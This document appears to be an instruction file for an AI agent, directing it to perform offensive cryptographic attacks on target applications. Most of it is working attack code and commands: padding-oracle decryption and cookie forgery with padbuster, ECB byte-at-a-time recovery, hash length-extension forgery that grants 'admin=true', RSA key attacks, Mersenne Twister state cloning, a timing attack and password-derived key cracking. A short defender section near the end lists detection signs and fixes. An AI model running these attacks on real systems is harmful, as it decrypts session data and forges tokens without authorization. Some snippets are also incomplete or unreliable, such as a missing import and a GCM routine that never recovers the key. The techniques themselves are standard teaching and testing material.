---
name: offensive-crypto-attacks
description: "Systematic methodology for identifying and exploiting cryptographic implementation weaknesses in real-world applications. Covers padding oracle attacks against CBC-mode ciphers with PKCS7 padding (Vaudenay's original attack through modern padbuster automation), ECB mode exploitation including block cut-and-paste and byte-at-a-time decryption, hash length extension attacks against SHA1/SHA256/MD5-based MACs using HashPump, RSA vulnerabilities including small public exponent, common modulus, Bleichenbacher PKCS1v1.5 padding oracle, and Coppersmith's method for partial key recovery. Addresses weak PRNG exploitation targeting time-seeded generators and Mersenne Twister MT19937 state recovery from observed outputs, timing side-channel attacks against comparison operations, nonce reuse in AES-GCM leading to authentication key recovery, and key derivation weaknesses including insufficient iteration counts and missing salts. Primary tooling includes padbuster, RsaCtfTool, hashpump, and PyCryptodome for building custom exploit payloads. Maps to CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-328 (Use of Weak Hash), and CWE-330 (Use of Insufficiently Random Values). Emphasizes black-box identification of vulnerable implementations before transitioning to targeted exploitation."
---

# Cryptographic Implementation Attacks

You are performing offensive cryptographic analysis against target applications. This skill covers the identification and exploitation of flawed cryptographic implementations -- not breaks against the underlying mathematical primitives, but against the ways developers misuse them. You treat every encrypted blob, signed token, and hashed value as a potential attack surface.

## Quick Workflow

1. Identify cryptographic touchpoints -- cookies, tokens, API parameters, stored credentials, signed URLs.
2. Fingerprint the algorithm and mode -- measure ciphertext length behavior, detect block alignment, check for Base64/hex encoding layers.
3. Classify the vulnerability class -- padding oracle, ECB determinism, weak MAC construction, RSA parameter weakness, PRNG predictability.
4. Select and configure the appropriate tool or custom script.
5. Execute the attack, decrypt or forge the target value.
6. Document the cryptographic weakness, its root cause, and the remediation path.

---

## Padding Oracle Attacks

Padding oracle attacks exploit systems that reveal whether CBC-mode decrypted plaintext has valid PKCS7 padding. A single bit of information -- valid or invalid padding -- is sufficient to decrypt any ciphertext block or forge arbitrary plaintext without knowing the key.

Identify the oracle by submitting modified ciphertext and observing differential responses. The oracle can manifest as distinct HTTP status codes, different error messages, timing differences, or behavioral changes in application logic.

Use padbuster for automated exploitation against web applications:

```bash
# Decrypt an encrypted cookie value
# URL is the endpoint, EncryptedValue is the target, BlockSize is typically 8 or 16
padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
  -cookies "session=EncryptedValue" \
  -encoding 0 \
  -error "invalid"

# Forge a new plaintext value using the discovered oracle
padbuster http://target.com/app?token=EncryptedValue EncryptedValue 16 \
  -cookies "session=EncryptedValue" \
  -encoding 0 \
  -error "invalid" \
  -plaintext "admin=true;user=attacker"
```

Build a custom padding oracle exploit when padbuster cannot handle the target's encoding or transport:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import struct

def oracle(iv, ciphertext, url):
    """Return True if the server accepts the padding."""
    payload = (iv + ciphertext).hex()
    resp = requests.get(url, params={"data": payload})
    return resp.status_code != 500  # Adapt to your oracle signal

def decrypt_block(prev_block, cipher_block, url, block_size=16):
    """Decrypt a single block via Vaudenay's attack."""
    intermediate = bytearray(block_size)
    plaintext = bytearray(block_size)

    for byte_pos in range(block_size - 1, -1, -1):
        pad_val = block_size - byte_pos
        crafted_iv = bytearray(block_size)

        # Set already-recovered bytes to produce correct padding
        for k in range(byte_pos + 1, block_size):
            crafted_iv[k] = intermediate[k] ^ pad_val

        for guess in range(256):
            crafted_iv[byte_pos] = guess
            if oracle(bytes(crafted_iv), cipher_block, url):
                # Handle the ambiguity on the last byte
                if byte_pos == block_size - 1:
                    crafted_iv[byte_pos - 1] ^= 1
                    if not oracle(bytes(crafted_iv), cipher_block, url):
                        continue
                intermediate[byte_pos] = guess ^ pad_val
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                break

    return bytes(plaintext)
```

---

## ECB Block Manipulation

ECB mode encrypts each block independently with the same key, producing identical ciphertext for identical plaintext blocks. This determinism enables two primary attacks: cut-and-paste block rearrangement and byte-at-a-time decryption.

Detect ECB mode by encrypting repeated plaintext and checking for repeated ciphertext blocks:

```python
def detect_ecb(ciphertext, block_size=16):
    """Detect ECB mode by finding duplicate blocks."""
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Probe an encryption oracle for ECB
# Send 3 blocks of identical bytes -- if 2+ output blocks match, it is ECB
probe = b"A" * (block_size * 3)
ciphertext = encryption_oracle(probe)
if detect_ecb(ciphertext):
    print("ECB mode confirmed")
```

Perform byte-at-a-time decryption against an oracle that appends a secret before encrypting:

```python
def byte_at_a_time_ecb(oracle_func, block_size=16):
    """Recover secret appended by an ECB encryption oracle."""
    recovered = b""

    # Determine the total secret length
    baseline_len = len(oracle_func(b""))

    for i in range(baseline_len):
        block_index = (len(recovered)) // block_size
        # Craft input so the target byte is the last byte of a block
        pad_len = block_size - 1 - (len(recovered) % block_size)
        padding = b"A" * pad_len

        # Get the target block
        target_ct = oracle_func(padding)
        target_block = target_ct[block_index * block_size:(block_index + 1) * block_size]

        # Brute-force the unknown byte
        for byte_val in range(256):
            test_input = padding + recovered + bytes([byte_val])
            test_ct = oracle_func(test_input)
            test_block = test_ct[block_index * block_size:(block_index + 1) * block_size]
            if test_block == target_block:
                recovered += bytes([byte_val])
                break

    return recovered
```

ECB cut-and-paste attacks rearrange ciphertext blocks to produce valid plaintext with attacker-controlled content. Target any system where structured data (JSON, key=value pairs, serialized objects) is ECB-encrypted and the attacker controls part of the input.

---

## Hash Length Extension

When an application computes a MAC as `H(secret || message)` using a Merkle-Damgard hash (MD5, SHA1, SHA256), you can append data to the message and compute a valid MAC without knowing the secret. You only need the original MAC, the message, and the secret length (or a range to brute-force).

Use hashpump to forge extended messages:

```bash
# hashpumpy Python bindings
pip install hashpumpy

# Forge an extended hash
# Original signature, original data, data to append, key length
hashpump -s "original_mac_hex" \
  -d "original_data" \
  -a "&admin=true" \
  -k 16
```

```python
import hashpumpy
import requests

original_mac = "a1b2c3d4e5f6..."
original_data = "user=guest&expire=2025"
append_data = "&admin=true"

# Try key lengths from 8 to 32
for key_len in range(8, 33):
    new_mac, new_data = hashpumpy.hashpump(
        original_mac, original_data, append_data, key_len
    )
    # Submit the forged request
    resp = requests.get(
        f"http://target.com/api?data={new_data.hex()}&mac={new_mac}"
    )
    if resp.status_code == 200 and "admin" in resp.text:
        print(f"Key length: {key_len}")
        print(f"Forged MAC: {new_mac}")
        break
```

HMAC constructions (`H(key XOR opad || H(key XOR ipad || message))`) are not vulnerable to length extension. If you identify HMAC in use, pivot to other attack vectors.

---

## RSA Attacks

RSA implementations fail in predictable ways. Target the mathematical parameters before attacking the padding scheme.

Use RsaCtfTool for automated RSA analysis:

```bash
# Attack a public key directly
RsaCtfTool --publickey pubkey.pem --private

# Decrypt a ciphertext with a known weak key
RsaCtfTool --publickey pubkey.pem --uncipherfile ciphertext.bin

# Attack multiple keys for common factor (shared prime)
RsaCtfTool --publickey "key1.pem,key2.pem" --private

# Specific attack selection
RsaCtfTool --publickey pubkey.pem --attack wiener
RsaCtfTool --publickey pubkey.pem --attack smallq
RsaCtfTool --publickey pubkey.pem --attack fermat
```

Exploit small public exponent (e=3) when the plaintext is short enough that `m^e < n`:

```python
from Crypto.PublicKey import RSA
from gmpy2 import iroot

def small_exponent_attack(ciphertext_int, e, n):
    """When m^e < n, the ciphertext is simply m^e with no modular reduction."""
    plaintext_int, is_perfect = iroot(ciphertext_int, e)
    if is_perfect:
        return int(plaintext_int).to_bytes(
            (int(plaintext_int).bit_length() + 7) // 8, 'big'
        )
    return None

# Hastad's broadcast attack: same message encrypted with e=3 to 3 recipients
def hastad_broadcast(ciphertexts, moduli, e=3):
    """CRT-based recovery when the same message is sent to e recipients."""
    from functools import reduce
    N = reduce(lambda a, b: a * b, moduli)
    result = 0
    for ci, ni in zip(ciphertexts, moduli):
        Ni = N // ni
        _, mi, _ = gmpy2.gcdext(Ni, ni)
        result += ci * Ni * int(mi)
    result = result % N
    plaintext, _ = iroot(result, e)
    return int(plaintext).to_bytes((int(plaintext).bit_length() + 7) // 8, 'big')
```

Bleichenbacher's attack targets RSA PKCS#1 v1.5 padding. The oracle is any system that distinguishes between valid and invalid PKCS#1 v1.5 padding after decryption. This includes TLS servers returning different alerts, APIs returning different error codes, and timing differences in error handling. The attack requires approximately 2^20 oracle queries to recover the plaintext.

Coppersmith's method recovers small unknown portions of RSA plaintext or factors when partial information is known. Use SageMath for the lattice computations:

```python
# SageMath: recover high bits of a factor
# If you know the top bits of p, Coppersmith finds the rest
n = <modulus>
p_approx = <known_high_bits_of_p>
P.<x> = PolynomialRing(Zmod(n))
f = p_approx + x
roots = f.small_roots(X=2^64, beta=0.5)  # X bounds the unknown portion
if roots:
    p = p_approx + int(roots[0])
    q = n // p
    print(f"p = {p}")
    print(f"q = {q}")
```

---

## Weak PRNG Exploitation

Applications that seed random number generators from predictable sources -- timestamps, PIDs, low-entropy pools -- produce predictable outputs.

Recover MT19937 (Mersenne Twister) internal state from 624 consecutive 32-bit outputs:

```python
def untemper(y):
    """Reverse the MT19937 tempering transform."""
    # Reverse: y ^= y >> 18
    y ^= y >> 18
    # Reverse: y ^= (y << 15) & 0xEFC60000
    y ^= (y << 15) & 0xEFC60000
    # Reverse: y ^= (y << 7) & 0x9D2C5680 (iterative)
    tmp = y
    for _ in range(7):
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
    y = tmp
    # Reverse: y ^= y >> 11 (iterative)
    tmp = y
    for _ in range(3):
        tmp = y ^ (tmp >> 11)
    y = tmp
    return y

def clone_mt19937(outputs_624):
    """Clone MT19937 state from exactly 624 observed 32-bit outputs."""
    import random
    mt_state = [untemper(o) for o in outputs_624]
    # Reconstruct the state tuple: (3, tuple(624 ints + index), None)
    state = (3, tuple(mt_state + [624]), None)
    cloned = random.Random()
    cloned.setstate(state)
    return cloned

# Predict all future outputs
cloned_rng = clone_mt19937(observed_outputs)
next_token = cloned_rng.getrandbits(32)
```

Exploit time-seeded PRNGs by narrowing the seed window:

```python
import random
import time

def brute_force_time_seed(known_output, time_window_start, time_window_end):
    """Recover the seed when random.seed() was called with int(time.time())."""
    for seed in range(int(time_window_start), int(time_window_end)):
        rng = random.Random(seed)
        if rng.getrandbits(32) == known_output:
            return seed
    return None
```

---

## Timing Side-Channel Attacks

Timing attacks exploit data-dependent execution time in cryptographic comparisons. The classic target is byte-by-byte string comparison of MACs, tokens, or passwords.

```python
import requests
import time
import statistics

def timing_attack_mac(url, known_prefix, charset, samples=20):
    """Recover a MAC byte-by-byte via timing side-channel."""
    best_byte = None
    best_time = 0

    for candidate in charset:
        test_mac = known_prefix + candidate + "\x00" * (32 - len(known_prefix) - 1)
        times = []
        for _ in range(samples):
            start = time.perf_counter_ns()
            requests.get(url, params={"mac": test_mac})
            elapsed = time.perf_counter_ns() - start
            times.append(elapsed)

        median = statistics.median(times)
        if median > best_time:
            best_time = median
            best_byte = candidate

    return known_prefix + best_byte

# Statistical enhancement: use percentile comparison to reduce noise
# Network jitter requires 50-100+ samples per candidate in practice
```

---

## AES-GCM Nonce Reuse

AES-GCM nonce reuse is catastrophic. Reusing a nonce with the same key allows recovery of the authentication key (GHASH key H) and enables both decryption of XOR'd plaintexts and forgery of authentication tags.

```python
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, bytes_to_long
import struct

def exploit_gcm_nonce_reuse(ct1, tag1, aad1, ct2, tag2, aad2, nonce):
    """
    Given two ciphertexts encrypted under the same key and nonce,
    recover the GHASH key H and forge tags for arbitrary messages.
    XOR of ciphertexts yields XOR of plaintexts.
    """
    # Recover plaintext XOR
    xor_plaintexts = bytes(a ^ b for a, b in zip(ct1, ct2))

    # Recover GHASH key H from the tag polynomial relationship
    # tag1 = GHASH(H, aad1, ct1) XOR E(K, nonce||0^31||1)
    # tag2 = GHASH(H, aad2, ct2) XOR E(K, nonce||0^31||1)
    # tag1 XOR tag2 = GHASH(H, aad1, ct1) XOR GHASH(H, aad2, ct2)
    # This yields a polynomial in H over GF(2^128)

    # The polynomial root gives H; use SageMath or a GF(2^128) library
    # for the actual field arithmetic
    print(f"Plaintext XOR: {xor_plaintexts.hex()}")
    print("Solve the GHASH polynomial in GF(2^128) to recover H")
    return xor_plaintexts
```

---

## Key Derivation Weaknesses

Target password-based key derivation with insufficient work factors:

```python
import hashlib
import itertools

# Weak KDF: single SHA-256 iteration, no salt
def crack_weak_kdf(target_key_hex, wordlist_path):
    """Crack a key derived via single-pass SHA-256 of a password."""
    target = bytes.fromhex(target_key_hex)
    with open(wordlist_path, 'r') as f:
        for word in f:
            word = word.strip()
            derived = hashlib.sha256(word.encode()).digest()
            if derived == target:
                return word
    return None

# Detect weak PBKDF2 iteration counts
def check_pbkdf2_strength(iterations, algorithm="sha256"):
    """Flag insufficient PBKDF2 parameters per OWASP 2024 guidance."""
    minimums = {
        "sha1": 1_300_000,
        "sha256": 600_000,
        "sha512": 210_000,
    }
    minimum = minimums.get(algorithm, 600_000)
    if iterations < minimum:
        print(f"WEAK: {iterations} iterations of PBKDF2-{algorithm}")
        print(f"Minimum recommended: {minimum}")
        return False
    return True
```

---

## Detection / Defender View

Defenders should monitor for the following indicators of cryptographic attacks:

- **Padding oracle probing**: High volumes of requests to the same endpoint with incrementally modified ciphertext parameters. Look for request patterns where a single byte changes across hundreds of sequential requests. Alert on endpoints returning binary pass/fail for encrypted input.
- **ECB detection probing**: Requests containing long runs of repeated characters (16+ identical bytes) submitted to encryption endpoints.
- **Hash length extension**: URL parameters or cookies containing null bytes (`%00`) in positions that should be printable text. Message bodies that are longer than expected with padding artifacts.
- **RSA parameter harvesting**: Repeated requests for public key endpoints, certificate downloads, or TLS handshake enumeration.
- **Timing attacks**: Unusual request patterns with high concurrency to authentication or MAC verification endpoints. Statistical analysis of response time distributions showing stepped patterns.
- **Nonce reuse**: Monitor encryption operations for counter resets or nonce collisions. Implement nonce-misuse-resistant AEAD modes (AES-GCM-SIV, XChaCha20-Poly1305) as defense in depth.

Remediation priorities: migrate from CBC to authenticated encryption (AES-GCM, ChaCha20-Poly1305), use HMAC instead of `H(secret||message)`, enforce minimum 2048-bit RSA keys with OAEP padding, use cryptographically secure RNGs (`secrets` module, `/dev/urandom`), implement constant-time comparison for all secret values, and enforce OWASP-recommended PBKDF2 iteration counts or migrate to Argon2id.

---

## Engagement Cheatsheet

| Target                 | Tool / Technique          | First Step                                    |
|------------------------|---------------------------|-----------------------------------------------|
| Encrypted cookie (CBC) | padbuster                 | Modify last byte, observe response difference |
| Encrypted token (ECB)  | Custom Python             | Send repeated blocks, check for repetition    |
| MAC = H(secret+msg)    | hashpumpy                 | Confirm Merkle-Damgard hash, try extensions   |
| RSA public key         | RsaCtfTool                | Extract n and e, check key size and factors   |
| Session token (PRNG)   | Custom Python             | Collect 624+ outputs, clone MT state          |
| Auth endpoint          | Timing script             | Measure response time per byte position       |
| AES-GCM encrypted API  | Custom Python / SageMath  | Detect nonce reuse across captured messages   |
| Password-derived key   | hashcat / custom script   | Identify KDF, check iteration count           |

Ciphertext identification heuristics:
- Length is multiple of 8 bytes: likely DES/3DES in CBC/ECB.
- Length is multiple of 16 bytes: likely AES in CBC/ECB.
- Length is plaintext + 16 bytes (tag): likely AES-GCM.
- Fixed-length output regardless of input: likely a hash, not encryption.

---

## Key References

- Vaudenay, S. "Security Flaws Induced by CBC Padding." EUROCRYPT 2002.
- Bleichenbacher, D. "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS#1." CRYPTO 1998.
- Duong, T. and Rizzo, J. "Practical Padding Oracle Attacks." USENIX WOOT 2010.
- Coppersmith, D. "Small Solutions to Polynomial Equations, and Low Exponent RSA Vulnerabilities." Journal of Cryptology, 1997.
- Joux, A. "Authentication Failures in NIST version of GCM." NIST Comment, 2006.
- CWE-327: Use of a Broken or Risky Cryptographic Algorithm.
- CWE-328: Use of Weak Hash.
- CWE-330: Use of Insufficiently Random Values.
- OWASP Password Storage Cheat Sheet (PBKDF2/Argon2id iteration guidance).
- RsaCtfTool: https://github.com/RsaCtfTool/RsaCtfTool
- padbuster: https://github.com/AonCyberLabs/PadBuster
- hashpumpy: https://github.com/bwall/HashPump
